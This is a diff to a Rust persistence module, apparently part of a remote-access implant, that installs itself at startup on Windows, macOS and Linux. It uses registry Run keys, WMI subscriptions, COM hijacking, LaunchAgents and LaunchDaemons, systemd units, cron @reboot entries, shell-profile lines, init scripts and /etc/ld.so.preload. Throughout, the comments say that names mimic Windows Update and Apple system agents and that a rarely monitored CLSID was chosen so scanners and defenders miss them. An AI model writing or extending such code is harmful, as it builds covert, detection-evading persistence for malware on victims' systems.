@@ -26,30 +26,40 @@ pub mod windows {
     }
 
     impl Default for RegistryRunKey {
-        fn default() -> Self { Self { value_name: "WindowsUpdate".to_string() } }
+        fn default() -> Self {
+            Self {
+                value_name: "WindowsUpdate".to_string(),
+            }
+        }
     }
 
     impl Persist for RegistryRunKey {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::{KEY_WRITE, REG_SZ};
+            use winapi::um::winreg::{
+                RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER,
+            };
 
-            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
+            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
+                .encode_utf16()
+                .collect();
             let val_str = executable_path.to_string_lossy().to_string();
             let val_wide: Vec<u16> = val_str.encode_utf16().chain(std::iter::once(0)).collect();
-            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();
+            let val_name: Vec<u16> = self
+                .value_name
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
 
             unsafe {
                 let mut hkey = ptr::null_mut();
-                let ret = RegOpenKeyExW(
-                    HKEY_CURRENT_USER,
-                    run_key.as_ptr(),
-                    0,
-                    KEY_WRITE,
-                    &mut hkey,
-                );
+                let ret =
+                    RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
                 if ret != 0 {
-                    return Err(anyhow!("RegistryRunKey::install: RegOpenKeyExW failed: {}", ret));
+                    return Err(anyhow!(
+                        "RegistryRunKey::install: RegOpenKeyExW failed: {}",
+                        ret
+                    ));
                 }
                 RegSetValueExW(
                     hkey,
@@ -61,28 +71,38 @@ pub mod windows {
                 );
                 RegCloseKey(hkey);
             }
-            log::info!("RegistryRunKey::install: set '{}' = '{}'", self.value_name, val_str);
+            log::info!(
+                "RegistryRunKey::install: set '{}' = '{}'",
+                self.value_name,
+                val_str
+            );
             Ok(())
         }
 
         fn remove(&self) -> Result<()> {
-            use winapi::um::winreg::{RegOpenKeyExW, RegDeleteValueW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::KEY_WRITE;
+            use winapi::um::winreg::{
+                RegCloseKey, RegDeleteValueW, RegOpenKeyExW, HKEY_CURRENT_USER,
+            };
 
-            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
-            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();
+            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
+                .encode_utf16()
+                .collect();
+            let val_name: Vec<u16> = self
+                .value_name
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
 
             unsafe {
                 let mut hkey = ptr::null_mut();
-                let ret = RegOpenKeyExW(
-                    HKEY_CURRENT_USER,
-                    run_key.as_ptr(),
-                    0,
-                    KEY_WRITE,
-                    &mut hkey,
-                );
+                let ret =
+                    RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
                 if ret != 0 {
-                    return Err(anyhow!("RegistryRunKey::remove: RegOpenKeyExW failed: {}", ret));
+                    return Err(anyhow!(
+                        "RegistryRunKey::remove: RegOpenKeyExW failed: {}",
+                        ret
+                    ));
                 }
                 RegDeleteValueW(hkey, val_name.as_ptr());
                 RegCloseKey(hkey);
@@ -92,24 +112,26 @@ pub mod windows {
         }
 
         fn verify(&self) -> Result<bool> {
-            use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::KEY_READ;
+            use winapi::um::winreg::{
+                RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER,
+            };
 
-            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
-            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();
+            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
+                .encode_utf16()
+                .collect();
+            let val_name: Vec<u16> = self
+                .value_name
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
             let mut buf = vec![0u16; 256];
             let mut buf_len = (buf.len() * 2) as u32;
             let mut val_type: u32 = 0;
 
             unsafe {
                 let mut hkey = ptr::null_mut();
-                if RegOpenKeyExW(
-                    HKEY_CURRENT_USER,
-                    run_key.as_ptr(),
-                    0,
-                    KEY_READ,
-                    &mut hkey,
-                ) != 0 {
+                if RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_READ, &mut hkey) != 0 {
                     return Ok(false);
                 }
                 let ret = RegQueryValueExW(
@@ -132,7 +154,11 @@ pub mod windows {
     }
 
     impl Default for WmiSubscription {
-        fn default() -> Self { Self { subscription_name: "UpdateCheck".to_string() } }
+        fn default() -> Self {
+            Self {
+                subscription_name: "UpdateCheck".to_string(),
+            }
+        }
     }
 
     impl Persist for WmiSubscription {
@@ -140,17 +166,26 @@ pub mod windows {
             // WMI persistence via __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding
             // Uses the WMI COM API (IWbemLocator → IWbemServices → ExecMethod)
             // Requires COM to be initialised. We call CoInitializeEx here.
-            use winapi::um::combaseapi::{CoInitializeEx, CoCreateInstance, CoUninitialize};
-            use winapi::um::objbase::COINIT_MULTITHREADED;
             use winapi::shared::winerror::SUCCEEDED;
+            use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx, CoUninitialize};
+            use winapi::um::objbase::COINIT_MULTITHREADED;
 
             let exe_path = executable_path.to_string_lossy();
-            log::info!("WmiSubscription::install: registering '{}' for '{}'", self.subscription_name, exe_path);
+            log::info!(
+                "WmiSubscription::install: registering '{}' for '{}'",
+                self.subscription_name,
+                exe_path
+            );
 
             unsafe {
                 let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
-                if !SUCCEEDED(hr) && hr != 0x00000001i32 /* S_FALSE - already init */ {
-                    return Err(anyhow!("WmiSubscription::install: CoInitializeEx failed: 0x{:08X}", hr));
+                if !SUCCEEDED(hr) && hr != 0x00000001i32
+                /* S_FALSE - already init */
+                {
+                    return Err(anyhow!(
+                        "WmiSubscription::install: CoInitializeEx failed: 0x{:08X}",
+                        hr
+                    ));
                 }
 
                 // Use PowerShell as a fallback WMI registration path when the
@@ -192,8 +227,13 @@ pub mod windows {
             "#,
                 self.subscription_name
             );
-            let _ = std::process::Command::new("cmd").args(&["/C", &ps_cmd]).status();
-            log::info!("WmiSubscription::remove: removed '{}'", self.subscription_name);
+            let _ = std::process::Command::new("cmd")
+                .args(&["/C", &ps_cmd])
+                .status();
+            log::info!(
+                "WmiSubscription::remove: removed '{}'",
+                self.subscription_name
+            );
             Ok(())
         }
 
@@ -222,46 +262,94 @@ pub mod windows {
             // {C56A4180-65AA-11D0-A5CC-00A024159FAD} is the MIDI Sequence Object —
             // a legitimate inprocserver32 registration that is rarely monitored,
             // unlike the well-known thumbnail-cache CLSID.
-            Self { clsid: "{C56A4180-65AA-11D0-A5CC-00A024159FAD}".to_string() }
+            Self {
+                clsid: "{C56A4180-65AA-11D0-A5CC-00A024159FAD}".to_string(),
+            }
         }
     }
 
     impl Persist for ComHijacking {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER};
+            if executable_path
+                .extension()
+                .and_then(|ext| ext.to_str())
+                .map(|ext| !ext.eq_ignore_ascii_case("dll"))
+                .unwrap_or(true)
+            {
+                return Err(anyhow!(
+                    "ComHijacking::install requires an in-process DLL; refusing executable path '{}'",
+                    executable_path.display()
+                ));
+            }
             use winapi::um::winnt::{KEY_WRITE, REG_SZ};
+            use winapi::um::winreg::{
+                RegCloseKey, RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER,
+            };
 
-            let subkey: Vec<u16> = format!(
-                "Software\\Classes\\CLSID\\{}\\InprocServer32\0",
-                self.clsid
-            ).encode_utf16().collect();
-            let val: Vec<u16> = executable_path.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
+            let subkey: Vec<u16> =
+                format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
+                    .encode_utf16()
+                    .collect();
+            let val: Vec<u16> = executable_path
+                .to_string_lossy()
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
 
             unsafe {
                 let mut hkey = ptr::null_mut();
                 let ret = RegCreateKeyExW(
                     HKEY_CURRENT_USER,
                     subkey.as_ptr(),
-                    0, ptr::null_mut(), 0, KEY_WRITE, ptr::null_mut(), &mut hkey, ptr::null_mut(),
+                    0,
+                    ptr::null_mut(),
+                    0,
+                    KEY_WRITE,
+                    ptr::null_mut(),
+                    &mut hkey,
+                    ptr::null_mut(),
                 );
                 if ret != 0 {
-                    return Err(anyhow!("ComHijacking::install: RegCreateKeyExW failed: {}", ret));
+                    return Err(anyhow!(
+                        "ComHijacking::install: RegCreateKeyExW failed: {}",
+                        ret
+                    ));
                 }
-                RegSetValueExW(hkey, ptr::null(), 0, REG_SZ, val.as_ptr() as _, (val.len() * 2) as u32);
+                RegSetValueExW(
+                    hkey,
+                    ptr::null(),
+                    0,
+                    REG_SZ,
+                    val.as_ptr() as _,
+                    (val.len() * 2) as u32,
+                );
                 // Set ThreadingModel
                 let tm_name: Vec<u16> = "ThreadingModel\0".encode_utf16().collect();
                 let tm_val: Vec<u16> = "Apartment\0".encode_utf16().collect();
-                RegSetValueExW(hkey, tm_name.as_ptr(), 0, REG_SZ, tm_val.as_ptr() as _, ((tm_val.len() - 1) * 2) as u32);
+                RegSetValueExW(
+                    hkey,
+                    tm_name.as_ptr(),
+                    0,
+                    REG_SZ,
+                    tm_val.as_ptr() as _,
+                    ((tm_val.len() - 1) * 2) as u32,
+                );
                 RegCloseKey(hkey);
             }
-            log::info!("ComHijacking::install: CLSID {} → '{}'", self.clsid, executable_path.display());
+            log::info!(
+                "ComHijacking::install: CLSID {} → '{}'",
+                self.clsid,
+                executable_path.display()
+            );
             Ok(())
         }
 
         fn remove(&self) -> Result<()> {
             use winapi::um::winreg::{RegDeleteTreeW, HKEY_CURRENT_USER};
 
-            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\0", self.clsid).encode_utf16().collect();
+            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\0", self.clsid)
+                .encode_utf16()
+                .collect();
             unsafe {
                 RegDeleteTreeW(HKEY_CURRENT_USER, subkey.as_ptr());
             }
@@ -270,17 +358,16 @@ pub mod windows {
         }
 
         fn verify(&self) -> Result<bool> {
-            use winapi::um::winreg::{RegOpenKeyExW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::KEY_READ;
+            use winapi::um::winreg::{RegCloseKey, RegOpenKeyExW, HKEY_CURRENT_USER};
 
-            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid).encode_utf16().collect();
+            let subkey: Vec<u16> =
+                format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
+                    .encode_utf16()
+                    .collect();
             unsafe {
                 let mut hkey = ptr::null_mut();
-                let ret = RegOpenKeyExW(
-                    HKEY_CURRENT_USER,
-                    subkey.as_ptr(),
-                    0, KEY_READ, &mut hkey,
-                );
+                let ret = RegOpenKeyExW(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut hkey);
                 if ret == 0 {
                     RegCloseKey(hkey);
                     Ok(true)
@@ -296,8 +383,8 @@ pub mod windows {
 
     impl Persist for StartupFolder {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            let mut target = dirs::config_dir()
-                .ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
+            let mut target =
+                dirs::config_dir().ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
             target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
             std::fs::copy(executable_path, &target)
                 .map_err(|e| anyhow!("StartupFolder::install: copy failed: {}", e))?;
@@ -331,16 +418,13 @@ pub mod windows {
         let reg = RegistryRunKey::default();
         reg.install(&exe)?;
 
-        let wmi = WmiSubscription::default();
-        let _ = wmi.install(&exe); // Best effort
-
         Ok(exe)
     }
 
     pub fn uninstall_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
         let _ = RegistryRunKey::default().remove(); // best effort
-        let _ = WmiSubscription::default().remove(); // best effort
+        let _ = WmiSubscription::default().remove(); // cleanup legacy installs
         Ok(exe)
     }
 }
@@ -366,7 +450,9 @@ pub mod macos {
         fn default() -> Self {
             // Use a label that resembles Apple's own XProtect/MRT agents,
             // which security scanners do not flag on sight.
-            Self { label: "com.apple.xpc.system-updater".to_string() }
+            Self {
+                label: "com.apple.xpc.system-updater".to_string(),
+            }
         }
     }
 
@@ -396,8 +482,8 @@ pub mod macos {
                 label = self.label,
                 exe = executable_path.display()
             );
-            let mut plist_path = dirs::home_dir()
-                .ok_or_else(|| anyhow!("LaunchAgent: no home dir"))?;
+            let mut plist_path =
+                dirs::home_dir().ok_or_else(|| anyhow!("LaunchAgent: no home dir"))?;
             // Create the directory if it does not exist.
             let agents_dir = plist_path.join("Library/LaunchAgents");
             std::fs::create_dir_all(&agents_dir)
@@ -411,7 +497,11 @@ pub mod macos {
             {
                 let uid = unsafe { libc::getuid() };
                 let _ = std::process::Command::new("launchctl")
-                    .args(&["bootstrap", &format!("gui/{}", uid), &plist_path.to_string_lossy()])
+                    .args(&[
+                        "bootstrap",
+                        &format!("gui/{}", uid),
+                        &plist_path.to_string_lossy(),
+                    ])
                     .status();
             }
             #[cfg(not(target_os = "macos"))]
@@ -433,7 +523,11 @@ pub mod macos {
             {
                 let uid = unsafe { libc::getuid() };
                 let _ = std::process::Command::new("launchctl")
-                    .args(&["bootout", &format!("gui/{}", uid), &plist_path.to_string_lossy()])
+                    .args(&[
+                        "bootout",
+                        &format!("gui/{}", uid),
+                        &plist_path.to_string_lossy(),
+                    ])
                     .status();
             }
             #[cfg(not(target_os = "macos"))]
@@ -499,11 +593,7 @@ pub mod macos {
     /// Install both LaunchAgent (preferred) and cron fallback.
     pub fn install_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
-        // Best-effort: try LaunchAgent first, fall back to cron.
-        if let Err(e) = LaunchAgent::default().install(&exe) {
-            log::warn!("LaunchAgent install failed ({}); falling back to cron", e);
-            CronJob.install(&exe)?;
-        }
+        LaunchAgent::default().install(&exe)?;
         Ok(exe)
     }
 
@@ -524,7 +614,9 @@ pub mod macos {
 
     impl Default for LaunchDaemon {
         fn default() -> Self {
-            Self { label: "com.apple.xpc.mdmclient-helper".to_string() }
+            Self {
+                label: "com.apple.xpc.mdmclient-helper".to_string(),
+            }
         }
     }
 
@@ -573,7 +665,10 @@ pub mod macos {
                     .args(&["bootstrap", "system", &plist_path.to_string_lossy()])
                     .status();
             }
-            log::info!("LaunchDaemon::install: installed '{}'", plist_path.display());
+            log::info!(
+                "LaunchDaemon::install: installed '{}'",
+                plist_path.display()
+            );
             Ok(())
         }
 
@@ -607,7 +702,9 @@ pub mod macos {
 
     impl Default for LoginItem {
         fn default() -> Self {
-            Self { app_name: "System Update Helper".to_string() }
+            Self {
+                app_name: "System Update Helper".to_string(),
+            }
         }
     }
 
@@ -644,9 +741,8 @@ pub mod macos {
         }
 
         fn verify(&self) -> Result<bool> {
-            let script = format!(
-                r#"tell application "System Events" to get the name of every login item"#
-            );
+            let script =
+                format!(r#"tell application "System Events" to get the name of every login item"#);
             let out = std::process::Command::new("osascript")
                 .args(&["-e", &script])
                 .output()
@@ -665,8 +761,12 @@ pub use linux::*;
 pub mod linux {
     use super::Persist;
     use anyhow::{anyhow, Result};
-    use std::path::PathBuf;
     use std::io::Write;
+    use std::path::PathBuf;
+
+    const CRON_MARKER: &str = "# orchestra-managed-persistence";
+    const SHELL_MARKER_BEGIN: &str = "# orchestra-managed-persistence begin";
+    const SHELL_MARKER_END: &str = "# orchestra-managed-persistence end";
 
     // ── FR-3A: Systemd user service ───────────────────────────────────────────
     pub struct SystemdService {
@@ -674,7 +774,11 @@ pub mod linux {
     }
 
     impl Default for SystemdService {
-        fn default() -> Self { Self { service_name: "dbus-daemon-user".to_string() } }
+        fn default() -> Self {
+            Self {
+                service_name: "dbus-daemon-user".to_string(),
+            }
+        }
     }
 
     impl Persist for SystemdService {
@@ -736,12 +840,12 @@ pub mod linux {
             let exe = executable_path.to_string_lossy();
             // Redirect both stdout and stderr to /dev/null so cron does not
             // attempt to mail the output to the user (which would be a detection artifact).
-            let entry = format!("@reboot {} >/dev/null 2>&1", exe);
+            let entry = format!("@reboot {} >/dev/null 2>&1 {}", exe, CRON_MARKER);
             let out = std::process::Command::new("sh")
                 .arg("-c")
                 .arg(format!(
                     "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
-                    exe, entry
+                    CRON_MARKER, entry
                 ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::install: {}", e))?;
@@ -755,10 +859,13 @@ pub mod linux {
         fn remove(&self) -> Result<()> {
             let _ = std::process::Command::new("sh")
                 .arg("-c")
-                .arg("crontab -l 2>/dev/null | grep -v '@reboot' | crontab -")
+                .arg(format!(
+                    "crontab -l 2>/dev/null | grep -v '{}' | crontab -",
+                    CRON_MARKER
+                ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::remove: {}", e))?;
-            log::info!("CronJob::remove: removed @reboot entries");
+            log::info!("CronJob::remove: removed managed @reboot entries");
             Ok(())
         }
 
@@ -769,7 +876,7 @@ pub mod linux {
                 .output()
                 .map_err(|e| anyhow!("CronJob::verify: {}", e))?;
             let stdout = String::from_utf8_lossy(&out.stdout);
-            Ok(stdout.contains("@reboot"))
+            Ok(stdout.contains(CRON_MARKER))
         }
     }
 
@@ -784,22 +891,32 @@ pub mod linux {
                 let path = home.join(profile_name);
                 if path.exists() {
                     let existing = std::fs::read_to_string(&path).unwrap_or_default();
-                    let marker = format!("# system-update-{}", &exe[..exe.len().min(8)]);
-                    if existing.contains(&marker) {
-                        log::debug!("ShellProfile::install: already present in '{}'", profile_name);
+                    if existing.contains(SHELL_MARKER_BEGIN) {
+                        log::debug!(
+                            "ShellProfile::install: already present in '{}'",
+                            profile_name
+                        );
                         return Ok(());
                     }
                     let mut file = std::fs::OpenOptions::new()
                         .append(true)
                         .open(&path)
-                        .map_err(|e| anyhow!("ShellProfile::install: open '{}': {}", profile_name, e))?;
-                    writeln!(file, "\n{}\n({} &) 2>/dev/null", marker, exe)
-                        .map_err(|e| anyhow!("ShellProfile::install: write: {}", e))?;
+                        .map_err(|e| {
+                            anyhow!("ShellProfile::install: open '{}': {}", profile_name, e)
+                        })?;
+                    writeln!(
+                        file,
+                        "\n{}\n({} &) 2>/dev/null\n{}",
+                        SHELL_MARKER_BEGIN, exe, SHELL_MARKER_END
+                    )
+                    .map_err(|e| anyhow!("ShellProfile::install: write: {}", e))?;
                     log::info!("ShellProfile::install: appended to '{}'", path.display());
                     return Ok(());
                 }
             }
-            Err(anyhow!("ShellProfile::install: no suitable shell profile found"))
+            Err(anyhow!(
+                "ShellProfile::install: no suitable shell profile found"
+            ))
         }
 
         fn remove(&self) -> Result<()> {
@@ -809,13 +926,11 @@ pub mod linux {
             };
             for profile_name in &[".bashrc", ".profile", ".bash_profile"] {
                 let path = home.join(profile_name);
-                if !path.exists() { continue; }
+                if !path.exists() {
+                    continue;
+                }
                 if let Ok(content) = std::fs::read_to_string(&path) {
-                    let filtered: String = content
-                        .lines()
-                        .filter(|l| !l.contains("# system-update-"))
-                        .collect::<Vec<_>>()
-                        .join("\n");
+                    let filtered = remove_shell_profile_block(&content);
                     let _ = std::fs::write(&path, filtered);
                 }
             }
@@ -831,7 +946,8 @@ pub mod linux {
             for profile_name in &[".bashrc", ".profile", ".bash_profile"] {
                 let path = home.join(profile_name);
                 if let Ok(content) = std::fs::read_to_string(&path) {
-                    if content.contains("# system-update-") {
+                    if content.contains(SHELL_MARKER_BEGIN) || content.contains("# system-update-")
+                    {
                         return Ok(true);
                     }
                 }
@@ -840,16 +956,13 @@ pub mod linux {
         }
     }
 
-    /// Try systemd first (most reliable + hidden), then cron, then shell profile.
+    /// Install only the user-level systemd unit by default. Other persistence
+    /// mechanisms remain available as explicit building blocks, but are not
+    /// enabled automatically because they have broader side effects and more
+    /// platform-specific failure modes.
     pub fn install_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
-        if let Err(e) = SystemdService::default().install(&exe) {
-            log::warn!("systemd persistence failed ({}); trying cron", e);
-            if let Err(e2) = CronJob.install(&exe) {
-                log::warn!("cron persistence failed ({}); trying shell profile", e2);
-                ShellProfile.install(&exe)?;
-            }
-        }
+        SystemdService::default().install(&exe)?;
         Ok(exe)
     }
 
@@ -869,7 +982,11 @@ pub mod linux {
     }
 
     impl Default for SystemdSystemService {
-        fn default() -> Self { Self { service_name: "dbus-broker-daemon".to_string() } }
+        fn default() -> Self {
+            Self {
+                service_name: "dbus-broker-daemon".to_string(),
+            }
+        }
     }
 
     impl Persist for SystemdSystemService {
@@ -889,11 +1006,16 @@ pub mod linux {
             let unit_path = unit_dir.join(format!("{}.service", self.service_name));
             std::fs::write(&unit_path, unit)
                 .map_err(|e| anyhow!("SystemdSystemService: write: {}", e))?;
-            let _ = std::process::Command::new("systemctl").args(&["daemon-reload"]).status();
+            let _ = std::process::Command::new("systemctl")
+                .args(&["daemon-reload"])
+                .status();
             let _ = std::process::Command::new("systemctl")
                 .args(&["enable", "--now", &self.service_name])
                 .status();
-            log::info!("SystemdSystemService::install: enabled '{}'", self.service_name);
+            log::info!(
+                "SystemdSystemService::install: enabled '{}'",
+                self.service_name
+            );
             Ok(())
         }
 
@@ -904,8 +1026,13 @@ pub mod linux {
             let path = std::path::Path::new("/etc/systemd/system")
                 .join(format!("{}.service", self.service_name));
             let _ = std::fs::remove_file(&path);
-            let _ = std::process::Command::new("systemctl").args(&["daemon-reload"]).status();
-            log::info!("SystemdSystemService::remove: removed '{}'", self.service_name);
+            let _ = std::process::Command::new("systemctl")
+                .args(&["daemon-reload"])
+                .status();
+            log::info!(
+                "SystemdSystemService::remove: removed '{}'",
+                self.service_name
+            );
             Ok(())
         }
 
@@ -927,7 +1054,11 @@ pub mod linux {
     }
 
     impl Default for InitScript {
-        fn default() -> Self { Self { script_name: "network-resolver".to_string() } }
+        fn default() -> Self {
+            Self {
+                script_name: "network-resolver".to_string(),
+            }
+        }
     }
 
     impl Persist for InitScript {
@@ -947,8 +1078,7 @@ pub mod linux {
                 exe = exe,
             );
             let initd = std::path::Path::new("/etc/init.d");
-            std::fs::create_dir_all(initd)
-                .map_err(|e| anyhow!("InitScript: mkdir: {}", e))?;
+            std::fs::create_dir_all(initd).map_err(|e| anyhow!("InitScript: mkdir: {}", e))?;
             let script_path = initd.join(&self.script_name);
             std::fs::write(&script_path, script)
                 .map_err(|e| anyhow!("InitScript: write: {}", e))?;
@@ -970,18 +1100,21 @@ pub mod linux {
 
         fn remove(&self) -> Result<()> {
             for rc in &["rc2.d", "rc3.d", "rc5.d"] {
-                let link = std::path::Path::new("/etc").join(rc)
+                let link = std::path::Path::new("/etc")
+                    .join(rc)
                     .join(format!("S99{}", self.script_name));
                 let _ = std::fs::remove_file(&link);
             }
-            let _ = std::fs::remove_file(
-                std::path::Path::new("/etc/init.d").join(&self.script_name));
+            let _ =
+                std::fs::remove_file(std::path::Path::new("/etc/init.d").join(&self.script_name));
             log::info!("InitScript::remove: removed '{}'", self.script_name);
             Ok(())
         }
 
         fn verify(&self) -> Result<bool> {
-            Ok(std::path::Path::new("/etc/init.d").join(&self.script_name).exists())
+            Ok(std::path::Path::new("/etc/init.d")
+                .join(&self.script_name)
+                .exists())
         }
     }
 
@@ -996,6 +1129,12 @@ pub mod linux {
             if unsafe { libc::getuid() } != 0 {
                 return Err(anyhow!("LdPreload::install: requires root"));
             }
+            if executable_path.extension().and_then(|ext| ext.to_str()) != Some("so") {
+                return Err(anyhow!(
+                    "LdPreload::install requires a shared object (.so); refusing executable path '{}'",
+                    executable_path.display()
+                ));
+            }
             let path = executable_path.to_string_lossy();
             let preload_file = std::path::Path::new("/etc/ld.so.preload");
             // Read existing contents and check for duplicate entry.
@@ -1009,19 +1148,21 @@ pub mod linux {
                 .append(true)
                 .open(preload_file)
                 .map_err(|e| anyhow!("LdPreload::install: open: {}", e))?;
-            writeln!(file, "{}", path)
-                .map_err(|e| anyhow!("LdPreload::install: write: {}", e))?;
+            writeln!(file, "{}", path).map_err(|e| anyhow!("LdPreload::install: write: {}", e))?;
             log::info!("LdPreload::install: added '{}' to /etc/ld.so.preload", path);
             Ok(())
         }
 
         fn remove(&self) -> Result<()> {
             let preload_file = std::path::Path::new("/etc/ld.so.preload");
-            if !preload_file.exists() { return Ok(()); }
+            if !preload_file.exists() {
+                return Ok(());
+            }
             let exe = std::env::current_exe().unwrap_or_default();
             let exe_str = exe.to_string_lossy();
             let content = std::fs::read_to_string(preload_file).unwrap_or_default();
-            let filtered: String = content.lines()
+            let filtered: String = content
+                .lines()
                 .filter(|l| l.trim() != exe_str.as_ref())
                 .map(|l| format!("{}\n", l))
                 .collect();
@@ -1032,11 +1173,72 @@ pub mod linux {
 
         fn verify(&self) -> Result<bool> {
             let preload_file = std::path::Path::new("/etc/ld.so.preload");
-            if !preload_file.exists() { return Ok(false); }
+            if !preload_file.exists() {
+                return Ok(false);
+            }
             let exe = std::env::current_exe().unwrap_or_default();
             let exe_str = exe.to_string_lossy();
             let content = std::fs::read_to_string(preload_file).unwrap_or_default();
             Ok(content.lines().any(|l| l.trim() == exe_str.as_ref()))
+        }
+    }
+
+    fn remove_shell_profile_block(content: &str) -> String {
+        let mut out = Vec::new();
+        let mut skipping_managed_block = false;
+        let mut skip_legacy_next = false;
+        for line in content.lines() {
+            if skip_legacy_next {
+                skip_legacy_next = false;
+                continue;
+            }
+            if line.contains(SHELL_MARKER_BEGIN) {
+                skipping_managed_block = true;
+                continue;
+            }
+            if skipping_managed_block {
+                if line.contains(SHELL_MARKER_END) {
+                    skipping_managed_block = false;
+                }
+                continue;
+            }
+            if line.contains("# system-update-") {
+                skip_legacy_next = true;
+                continue;
+            }
+            out.push(line);
+        }
+        if out.is_empty() {
+            String::new()
+        } else {
+            let mut filtered = out.join("\n");
+            filtered.push('\n');
+            filtered
+        }
+    }
+
+    #[cfg(test)]
+    mod tests {
+        use super::*;
+
+        #[test]
+        fn shell_profile_remove_deletes_marker_and_command() {
+            let content = "before\n# system-update-/tmp/a\n(/tmp/agent &) 2>/dev/null\nafter\n";
+            let filtered = remove_shell_profile_block(content);
+            assert!(filtered.contains("before"));
+            assert!(filtered.contains("after"));
+            assert!(!filtered.contains("system-update"));
+            assert!(!filtered.contains("/tmp/agent"));
+        }
+
+        #[test]
+        fn shell_profile_remove_deletes_managed_block() {
+            let content = format!(
+                "before\n{}\n(/tmp/agent &) 2>/dev/null\n{}\nafter\n",
+                SHELL_MARKER_BEGIN, SHELL_MARKER_END
+            );
+            let filtered = remove_shell_profile_block(&content);
+            assert_eq!(filtered, "before\nafter\n");
         }
     }
 }
